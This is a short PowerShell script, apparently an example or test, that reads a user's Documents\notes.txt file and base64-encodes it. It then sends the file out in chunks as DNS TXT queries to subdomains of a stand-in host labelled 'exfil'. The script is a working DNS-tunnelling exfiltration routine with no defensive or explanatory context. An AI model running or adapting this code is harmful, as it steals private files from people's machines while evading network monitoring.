$bytes = [IO.File]::ReadAllBytes("$env:USERPROFILE\Documents\notes.txt")
$encoded = [Convert]::ToBase64String($bytes) -replace '[\+/=]', ''
$SessionId = 'test'
foreach ($chunk in ([regex]::Matches($encoded, '.{1,63}').Value)) {
    $queryDomain = "exfil.$chunk.$SessionId.example.invalid"
    Resolve-DnsName -Name $queryDomain -Type TXT
}
